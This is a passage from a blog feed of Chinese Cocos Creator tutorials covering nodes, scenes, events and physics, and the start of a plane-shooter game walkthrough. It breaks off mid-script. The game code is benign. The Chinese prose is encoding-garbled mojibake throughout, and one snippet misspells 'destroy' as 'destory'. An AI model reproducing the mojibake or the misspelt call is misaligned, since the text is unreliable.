å˜æ¢èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">this</span>.node.setPosition(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">this</span>.node.position = <span class="keyword">new</span> Vec3(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">this</span>.node.setRotation(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">this</span>.node.setScale(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="2-3-åˆ›å»º-é”€æ¯èŠ‚ç‚¹"><a href="#2-3-åˆ›å»º-é”€æ¯èŠ‚ç‚¹" class="headerlink" title="2.3 åˆ›å»º/é”€æ¯èŠ‚ç‚¹"></a>2.3 åˆ›å»º/é”€æ¯èŠ‚ç‚¹</h4><ul><li><code>instantiate</code> å…‹éš†åœºæ™¯ä¸­çš„å·²æœ‰èŠ‚ç‚¹</li><li><code>Pretab</code> é¢„åˆ¶ä»¶ï¼Œç”¨äºå­˜å‚¨ä¸€äº›å¯ä»¥å¤ç”¨çš„åœºæ™¯å¯¹è±¡ï¼Œå®ƒå¯ä»¥åŒ…å«èŠ‚ç‚¹ã€ç»„ä»¶ä»¥åŠç»„ä»¶ä¸Šçš„æ•°æ®ã€‚å¦‚å°„å‡»æ¸¸æˆé‡Œçš„å­å¼¹<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºèŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">const</span> node = <span class="keyword">new</span> Node(<span class="string">'box'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…‹éš†èŠ‚ç‚¹</span></span><br><span class="line">@property(Prefab)</span><br><span class="line">private bullet: Prefab = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> node = instantiate(<span class="keyword">this</span>.bullet)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†èŠ‚ç‚¹æ·»åŠ åˆ°åœºæ™¯</span></span><br><span class="line"><span class="keyword">const</span> scene = director.getScene()</span><br><span class="line">scene.addChild(node)</span><br><span class="line"></span><br><span class="line"><span class="comment">// é”€æ¯èŠ‚ç‚¹</span></span><br><span class="line">node.destory()</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-åŠ è½½å’Œåˆ‡æ¢åœºæ™¯"><a href="#3-åŠ è½½å’Œåˆ‡æ¢åœºæ™¯" class="headerlink" title="3. åŠ è½½å’Œåˆ‡æ¢åœºæ™¯"></a>3. åŠ è½½å’Œåˆ‡æ¢åœºæ™¯</h4><p>å¼•æ“åŒæ—¶åªä¼šè¿è¡Œä¸€ä¸ªåœºæ™¯ï¼Œå½“åˆ‡æ¢åœºæ™¯æ—¶ï¼Œé»˜è®¤ä¼šå°†åœºæ™¯å†…æ‰€æœ‰èŠ‚ç‚¹å’Œå…¶ä»–å®ä¾‹é”€æ¯ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦ç”¨ä¸€ä¸ªç»„ä»¶æ§åˆ¶æ‰€æœ‰åœºæ™¯çš„åŠ è½½ï¼Œæˆ–åœ¨åœºæ™¯ä¹‹é—´ä¼ é€’å‚æ•°æ•°æ®ï¼Œå°±éœ€è¦å°†è¯¥ç»„ä»¶æ‰€åœ¨èŠ‚ç‚¹æ ‡è®°ä¸ºã€Œå¸¸é©»èŠ‚ç‚¹ã€<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åŠ è½½åœºæ™¯</span></span><br><span class="line">director.loadScene(<span class="string">"MyScene"</span>, () =&gt; &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é¢„åŠ è½½åœºæ™¯</span></span><br><span class="line">director.preloadScene(<span class="string">"MyScene"</span>, () =&gt; &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®ä¸ºå¸¸é©»åœºæ™¯</span></span><br><span class="line">director.addPersistRootNode(myNode);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å–æ¶ˆä¸€ä¸ªèŠ‚ç‚¹çš„å¸¸é©»å±æ€§</span></span><br><span class="line">director.removePersistRootNode(myNode);</span><br></pre></td></tr></table></figure></p><h3 id="4-èµ„æº"><a href="#4-èµ„æº" class="headerlink" title="4. èµ„æº"></a>4. èµ„æº</h3><p>å½“å¼•æ“åœ¨åŠ è½½åœºæ™¯æ—¶ï¼Œä¼šå…ˆè‡ªåŠ¨åŠ è½½åœºæ™¯å…³è”åˆ°çš„èµ„æºï¼Œè¿™äº›èµ„æºå¦‚æœå†å…³è”å…¶å®ƒèµ„æºï¼Œå…¶å®ƒä¹Ÿä¼šè¢«å…ˆè¢«åŠ è½½ï¼Œç­‰åŠ è½½å…¨éƒ¨å®Œæˆåï¼Œåœºæ™¯åŠ è½½æ‰ä¼šç»“æŸã€‚<br>Texture2Dã€SpriteFrameã€AnimationClipã€Prefab</p><h3 id="5-äº‹ä»¶"><a href="#5-äº‹ä»¶" class="headerlink" title="5. äº‹ä»¶"></a>5. äº‹ä»¶</h3><h4 id="5-1-EventTarget"><a href="#5-1-EventTarget" class="headerlink" title="5.1 EventTarget"></a>5.1 EventTarget</h4><p>è‡ªå®šä¹‰äº‹ä»¶çš„ç›‘å¬å’Œå‘å°„<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; EventTarget &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> eventTarget = <span class="keyword">new</span> EventTarget();</span><br><span class="line">eventTarget.on(type, func, target?);</span><br><span class="line">eventTarget.emit(type, ...args);</span><br></pre></td></tr></table></figure></p><h3 id="6-ç‰©ç†ç³»ç»Ÿ"><a href="#6-ç‰©ç†ç³»ç»Ÿ" class="headerlink" title="6. ç‰©ç†ç³»ç»Ÿ"></a>6. ç‰©ç†ç³»ç»Ÿ</h3><h4 id="6-1-åˆ†ç»„å’Œæ©ç "><a href="#6-1-åˆ†ç»„å’Œæ©ç " class="headerlink" title="6.1 åˆ†ç»„å’Œæ©ç "></a>6.1 åˆ†ç»„å’Œæ©ç </h4><ul><li>é…ç½®ç¢°æ’çŸ©é˜µï¼šProject - Project Settings - Physics - Add group</li><li>ç»™ç¢°æ’ä½“æ·»åŠ ç¢°æ’ç»„ä»¶ï¼š<br>Cocosæ”¯æŒä¸‰ç§ç¢°æ’ç»„ä»¶ï¼šç›’ç¢°æ’ç»„ä»¶ï¼ˆBoxCollider2Dï¼‰ã€åœ†å½¢ç¢°æ’ç»„ä»¶ï¼ˆCircleCollider2Dï¼‰ å’Œ å¤šè¾¹å½¢ç¢°æ’ç»„ä»¶ï¼ˆPolygonCollider2Dï¼‰</li><li>è®¾ç½®ç¢°æ’ç»„ä»¶åˆ†ç»„Groupï¼Œé€šè¿‡ç¢°æ’çŸ©é˜µè®¾ç½®ä¸åŒåˆ†ç»„ç¢°æ’çš„å¯èƒ½æ€§</li></ul><h4 id="6-2-ç¢°æ’å™¨-amp-è§¦å‘å™¨"><a href="#6-2-ç¢°æ’å™¨-amp-è§¦å‘å™¨" class="headerlink" title="6.2 ç¢°æ’å™¨ &amp; è§¦å‘å™¨"></a>6.2 ç¢°æ’å™¨ &amp; è§¦å‘å™¨</h4><ul><li>ç¢°æ’ä½“ï¼šç”¨äºå®šä¹‰éœ€è¦è¿›è¡Œç‰©ç†ç¢°æ’çš„ç‰©ä½“å½¢çŠ¶</li><li><p>åˆšä½“ï¼šå®ƒå¯ä»¥ä½¿æ¸¸æˆå¯¹è±¡çš„è¿åŠ¨æ–¹å¼å—ç‰©ç†æ§åˆ¶</p><ul><li><code>Group</code></li><li><code>Type</code><ul><li><code>STATIC</code>: é™æ€åˆšä½“åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ç”¨äºä¸€äº›å§‹ç»ˆåœç•™åœ¨ä¸€ä¸ªåœ°æ–¹ï¼Œä¸ä¼šè½»æ˜“ç§»åŠ¨çš„æ¸¸æˆç‰©ä½“</li><li><code>DYNAMIC</code>ï¼šåŠ¨åŠ›å­¦åˆšä½“ï¼Œå¯ä»¥é€šè¿‡åŠ›çš„ä½œç”¨è¿åŠ¨ç‰©ä½“</li><li><code>KINEMATIC</code>ï¼šä¸ä¼šåƒåŠ¨åŠ›å­¦åˆšä½“ä¸€æ ·å“åº”åŠ›å’Œç¢°æ’ï¼Œé€šå¸¸ç”¨äºè¡¨è¾¾ç”µæ¢¯è¿™ç±»å¹³å°è¿åŠ¨çš„ç‰©ä½“ã€‚å®ƒä¸é™æ€åˆšä½“ç±»ä¼¼ï¼Œä¸åŒçš„åœ°æ–¹åœ¨äºç§»åŠ¨çš„è¿åŠ¨åˆšä½“ä¼šå¯¹å…¶ä»–å¯¹è±¡æ–½åŠ æ‘©æ“¦åŠ›ï¼Œå¹¶åœ¨æ¥è§¦æ—¶å”¤é†’å…¶ä»–åˆšä½“ã€‚</li></ul></li><li><code>Is Trigger</code>: æ˜¯å¦å¯ç”¨è§¦å‘å™¨æ¨¡å¼<br><code>true</code>: <em>è§¦å‘å™¨</em>ï¼Œåªç”¨äºç¢°æ’æ£€æµ‹è§¦å‘äº‹ä»¶<br><code>false</code>: <em>ç¢°æ’å™¨</em>ï¼Œå¯ä»¥ç»“åˆåˆšä½“äº§ç”Ÿç¢°æ’æ•ˆæœ</li><li><p>è§¦å‘äº‹ä»¶: å¯ä»¥ç”±è§¦å‘å™¨å’Œå¦ä¸€ä¸ªè§¦å‘å™¨/ç¢°æ’å™¨äº§ç”Ÿã€‚</p><ul><li><code>onTriggerEnter</code></li><li><code>onTriggerStay</code></li><li><code>onTriggerExit</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç›‘å¬è§¦å‘äº‹ä»¶</span></span><br><span class="line"><span class="keyword">import</span> &#123; BoxCollider, ITriggerEvent &#125; <span class="keyword">from</span> <span class="string">'cc'</span></span><br><span class="line"></span><br><span class="line">public start() &#123;</span><br><span class="line">  <span class="keyword">const</span> collider = <span class="keyword">this</span>.node.getComponent(BoxCollider)</span><br><span class="line">  collider.on(<span class="string">'onTriggerEnter'</span>, <span class="keyword">this</span>.onTriggerEnter, <span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private onTriggerEnter(event: ITriggerEvent) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.type)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>ç¢°æ’äº‹ä»¶: ç¢°æ’äº‹ä»¶éœ€è¦ç”±ä¸¤ä¸ªç¢°æ’å™¨äº§ç”Ÿï¼Œå¹¶ä¸”è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯åŠ¨åŠ›å­¦åˆšä½“ã€‚</p><ul><li><code>onCollisionEnter</code></li><li><code>onCollisionStay</code></li><li><code>onCollisionExit</code></li></ul></li></ul></li></ul><h3 id="4-é¡¹ç›®ç›®å½•"><a href="#4-é¡¹ç›®ç›®å½•" class="headerlink" title="4. é¡¹ç›®ç›®å½•"></a>4. é¡¹ç›®ç›®å½•</h3><ul><li>assets å­˜æ”¾æ¸¸æˆèµ„æº<ul><li>library, local, temp ä¸´æ—¶ç”Ÿæˆçš„æ–‡ä»¶å¤¹ï¼Œå¯åˆ é™¤ï¼Œåˆ é™¤åcocosä¼šè‡ªåŠ¨ç”Ÿæˆ</li><li></li></ul></li><li>script å­˜æ”¾è„šæœ¬</li></ul><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://docs.cocos.com/creator/3.8/manual/zh/scripting/life-cycle-callbacks.html" target="_blank" rel="noopener">Cocos Creatorå®˜ç½‘æ–‡æ¡£</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CocosCreator ä»¿é£æœºå¤§æˆ˜</title>
      <link href="/2024/12/16/cocos-%E9%B9%B0%E5%87%BB%E9%95%BF%E7%A9%BA/"/>
      <url>/2024/12/16/cocos-%E9%B9%B0%E5%87%BB%E9%95%BF%E7%A9%BA/</url>
      <content type="html"><![CDATA[<blockquote><p>å®ç°ä¸€ä¸ªç®€æ˜“ç‰ˆé£æœºå°„å‡»æ¸¸æˆ â€”â€” é¹°å‡»é•¿ç©º(cocos creator 3.84)<br><img src="/2024/12/16/cocos-é¹°å‡»é•¿ç©º/2.jpeg" style="max-width: 130px; display: inline-block; margin: 10px"><img src="/2024/12/16/cocos-é¹°å‡»é•¿ç©º/1.png" style="max-width: 130px; display: inline-block; margin: 10px"></p></blockquote><p><br></p><h3 id="1-æ»šåŠ¨èƒŒæ™¯"><a href="#1-æ»šåŠ¨èƒŒæ™¯" class="headerlink" title="1. æ»šåŠ¨èƒŒæ™¯"></a>1. æ»šåŠ¨èƒŒæ™¯</h3><h4 id="1-1-åˆ›å»ºèƒŒæ™¯æ¿"><a href="#1-1-åˆ›å»ºèƒŒæ™¯æ¿" class="headerlink" title="1.1 åˆ›å»ºèƒŒæ™¯æ¿"></a><em>1.1 åˆ›å»ºèƒŒæ™¯æ¿</em></h4><ul><li>æ·»åŠ é¢ç‰‡ create 3D Object - Plane(é¢æ¿)</li><li>æ–°å»ºæè´¨ï¼šèµ„æºç®¡ç†å™¨Assets - create Material - Effecté€‰builtin-unlit - å‹¾é€‰ USE TEXTURE - è®¾ç½® Main Textureï¼ˆæ”¾å…¥èƒŒæ™¯å›¾ï¼‰</li><li>æè´¨åº”ç”¨åˆ°èƒŒæ™¯æ¿ä¸Šï¼šPlaneå±æ€§ - Materials - é€‰ä¸­åˆšåˆ›å»ºçš„æè´¨</li></ul><p><br></p><h4 id="1-2-è®¾ç½®é¢„è§ˆå°ºå¯¸"><a href="#1-2-è®¾ç½®é¢„è§ˆå°ºå¯¸" class="headerlink" title="1.2 è®¾ç½®é¢„è§ˆå°ºå¯¸"></a><em>1.2 è®¾ç½®é¢„è§ˆå°ºå¯¸</em></h4><ul><li>åå¥½è®¾ç½®Perferences - Device Manager - éšæœºé€‰ä¸€ä¸ªè®¾å¤‡ï¼Œæ”¹å˜å®½é«˜ä¸º720 * 1280px(é€‚åˆç§»åŠ¨ç«¯é¢„è§ˆ), Device Nameä¸ºdevelopï¼ŒAdd Device</li><li>ç‚¹å‡»Main Camera - Sceneç¼©ç•¥å›¾ä¸­é€‰ç”¨åˆšåˆšè®¾ç½®å¥½çš„developè§†å›¾</li><li>è®¾ç½®Cameraå‚æ•°ï¼š<code>Rotation: -90 0 0</code>, <code>Projection: ORTHO(æ­£äº¤ç›¸æœºï¼Œæ€ä¹ˆå¼„éƒ½ä¸ä¼šåŠ¨)</code>, <code>Position: 0 10 0</code></li><li>è®¾ç½®èƒŒæ™¯æ¿å‚æ•°ï¼š<code>Scale: 1 1 2</code>, <code>Position: 0 10 0</code>, å¾®è°ƒè®©èƒŒæ™¯å›¾è¦†ç›–é¢„è§ˆæ¡†</li></ul><p><br></p><h4 id="1-3-å®ç°æ»šåŠ¨æ•ˆæœ"><a href="#1-3-å®ç°æ»šåŠ¨æ•ˆæœ" class="headerlink" title="1.3 å®ç°æ»šåŠ¨æ•ˆæœ"></a><em>1.3 å®ç°æ»šåŠ¨æ•ˆæœ</em></h4><ul><li>create empty node <code>movingBg</code> - å¤åˆ¶èƒŒæ™¯æ¿ä¸ºbg1, bg2æ”¾å…¥<code>movingBg</code>ä¸­, ä¸¤ä¸ªèƒŒæ™¯æ¿è½®æµæ›¿æ¢ï¼Œå®ç°æ»šåŠ¨æ•ˆæœ</li><li>èµ„æºç®¡ç†å™¨Assets - æ–°å»ºæ–‡ä»¶å¤¹scriptå­˜æ”¾è„šæœ¬èµ„æº - æ–°å»ºmovingBg.ts - å°†scrpitæ‹–å…¥<code>movingBg</code></li><li><code>movingBg</code>å±æ€§ä¸­è®¾ç½®<code>bg1</code>, <code>bg2</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// movingBg.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'movingBg'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">movingBg</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  @property(Node)</span><br><span class="line">  bg1: Node = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">  @property(Node)</span><br><span class="line">  bg2: Node = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">  private _bgSpeed = <span class="number">2</span></span><br><span class="line">  private _bgMovingRange = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">  private moveBg(deltaTime: number) &#123;</span><br><span class="line">    <span class="keyword">this</span>.bg1.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.bg1.position.z + <span class="keyword">this</span>._bgSpeed * deltaTime)</span><br><span class="line">    <span class="keyword">this</span>.bg2.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.bg2.position.z + <span class="keyword">this</span>._bgSpeed * deltaTime)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.bg1.position.z &gt; <span class="keyword">this</span>._bgMovingRange) &#123;</span><br><span class="line">      <span class="keyword">this</span>.bg1.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.bg2.position.z - <span class="keyword">this</span>._bgMovingRange)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.bg2.position.z &gt; <span class="keyword">this</span>._bgMovingRange)&#123;</span><br><span class="line">      <span class="keyword">this</span>.bg2.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.bg1.position.z - <span class="keyword">this</span>._bgMovingRange)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  start() &#123;</span><br><span class="line">    <span class="keyword">this</span>.bg1.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">this</span>.bg2.setPosition(<span class="number">0</span>, <span class="number">0</span>, -<span class="keyword">this</span>._bgMovingRange)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  update(deltaTime: number) &#123;</span><br><span class="line">    <span class="keyword">this</span>.moveBg(deltaTime)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-ç‰©ä»¶"><a href="#2-ç‰©ä»¶" class="headerlink" title="2. ç‰©ä»¶"></a>2. ç‰©ä»¶</h3><h4 id="2-1-ç©å®¶é£æœº"><a href="#2-1-ç©å®¶é£æœº" class="headerlink" title="2.1 ç©å®¶é£æœº"></a><em>2.1 ç©å®¶é£æœº</em></h4><ul><li>Sceneé‡Œåˆ›å»º<code>player</code>ç©ºèŠ‚ç‚¹</li><li>å°†assetsä¸­<code>plane01.mesh</code>æ‹–å…¥<code>player</code>ä¸‹</li><li>å°†<code>plane01.material</code>çš„Effectè®¾ç½®ä¸º<code>builtin-unlit</code>,æè´¨åº”ç”¨åˆ°é£æœºä¸Š</li></ul><p><br></p><h4 id="2-2-é£æœºå­å¼¹-Prefab"><a href="#2-2-é£æœºå­å¼¹-Prefab" class="headerlink" title="2.2 é£æœºå­å¼¹ Prefab"></a><em>2.2 é£æœºå­å¼¹ Prefab</em></h4><ul><li>aseets create bullet.material - Effecté€‰builtin-unlit - USE TEXTUREé€‰å­å¼¹å›¾ç‰‡ - Techniqueé€‰<code>3-alpha-blend</code>æ¥è®©å›¾ç‰‡é€æ˜éƒ¨åˆ†å˜é€æ˜</li><li>assets create Node Prefab å­å¼¹é¢„åˆ¶ä»¶ - åŒå‡»é¢„åˆ¶ä»¶ï¼Œè¿›å…¥é¢„åˆ¶ä»¶ç¼–è¾‘æ¨¡å¼ - add component - Materialè®¾ç½®ä¸ºå­å¼¹æè´¨ï¼ŒMeshè®¾ç½®ä¸ºquad.meshï¼Œåˆ›å»ºå¹¶ç»‘å®šå­å¼¹é£è¡Œè„šæœ¬bullet.ts <em>ï¼ˆç‚¹å‡»Sceneå·¦ä¸Šè§’ save + closeï¼Œå¯é€€å‡ºé¢„åˆ¶ä»¶ç¼–è¾‘æ¨¡å¼ï¼‰</em><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'playerBullet'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">playerBullet</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    private _speed = <span class="number">0.1</span>;</span><br><span class="line">    private _range = <span class="number">-10</span></span><br><span class="line"></span><br><span class="line">    update(deltaTime: number) &#123;</span><br><span class="line">        <span class="keyword">const</span> pos = <span class="keyword">this</span>.node.position</span><br><span class="line">        <span class="keyword">const</span> z = pos.z - <span class="keyword">this</span>._speed</span><br><span class="line">        <span class="keyword">this</span>.node.setPosition(pos.x, pos.y, z)</span><br><span class="line">        <span class="keyword">if</span> (z &lt; <span class="keyword">this</span>._range) &#123;</span><br><span class="line">            <span class="keyword">this</span>.node.destroy()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-3-æ•Œæœº-Prefab-ç‰©ç†ç¢°æ’"><a href="#2-3-æ•Œæœº-Prefab-ç‰©ç†ç¢°æ’" class="headerlink" title="2.3 æ•Œæœº Prefab + ç‰©ç†ç¢°æ’"></a><em>2.3 æ•Œæœº Prefab + ç‰©ç†ç¢°æ’</em></h4><p>åŒ2.2æ­¥éª¤ï¼Œåˆ›å»ºæ•ŒæœºPrefabï¼Œ ç»‘å®šæ•Œæœºè„šæœ¬ï¼Œå¢åŠ ç‰©ç†ç¢°æ’ï¼Œå­å¼¹å’Œæ•Œæœºç¢°æ’æ—¶ï¼Œé”€æ¯æ•Œæœºã€‚</p><ul><li>é…ç½®ç¢°æ’çŸ©é˜µï¼šProject - Project Settings - Physics - Add group - è®¾ç½®ç¢°æ’çŸ©é˜µ<ul><li>player</li><li>enemy</li><li>player bullet</li><li>enemy bullet</li></ul></li><li>ç»™ç‰©ä»¶æ·»åŠ ç¢°æ’ç»„ä»¶ add component - physics - BoxCollider - å‹¾é€‰ Is Trigger(è¿™é‡Œåªç”¨åˆ°è§¦å‘å™¨)</li><li>ç»™ç‰©ä»¶æ·»åŠ  add component - physics - RigidBody - è®¾ç½®Group - Type: KINEMATIC(è¿åŠ¨ç‰©ä½“)</li><li>æ·»åŠ ç¢°æ’æ£€æµ‹js<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node, BoxCollider &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'enemy'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">enemy</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  private _speed = <span class="number">0.1</span>;</span><br><span class="line">  private _range = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">  start() &#123;</span><br><span class="line">    <span class="keyword">const</span> collider = <span class="keyword">this</span>.node.getComponent(BoxCollider)</span><br><span class="line">    collider.on(<span class="string">'onTriggerEnter'</span>, <span class="keyword">this</span>.onTriggerEnter, <span class="keyword">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç¢°æ’æ£€æµ‹</span></span><br><span class="line">  private onTriggerEnter() &#123;</span><br><span class="line">    <span class="keyword">this</span>.node.destroy()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  update(deltaTime: number) &#123;</span><br><span class="line">    <span class="keyword">const</span> pos = <span class="keyword">this</span>.node.position</span><br><span class="line">    <span class="keyword">const</span> z = pos.z + <span class="keyword">this</span>._speed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.node.setPosition(pos.x, pos.y, z)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (z &gt; <span class="keyword">this</span>._range) &#123;</span><br><span class="line">      <span class="keyword">this</span>.node.destroy()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-æ¸¸æˆé€»è¾‘"><a href="#3-æ¸¸æˆé€»è¾‘" class="headerlink" title="3. æ¸¸æˆé€»è¾‘"></a>3. æ¸¸æˆé€»è¾‘</h3><h4 id="3-1-UiMain-ts-ç”¨æˆ·äº¤äº’"><a href="#3-1-UiMain-ts-ç”¨æˆ·äº¤äº’" class="headerlink" title="3.1 UiMain.ts ç”¨æˆ·äº¤äº’"></a>3.1 UiMain.ts ç”¨æˆ·äº¤äº’</h4><p>åˆ›å»ºè„šæœ¬<code>UiMain.ts</code>ç”¨æ¥å¤„ç†ç”¨æˆ·äº¤äº’äº‹ä»¶ï¼ŒæŒ‚è½½åˆ°sceneä¸‹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node, input, Input, 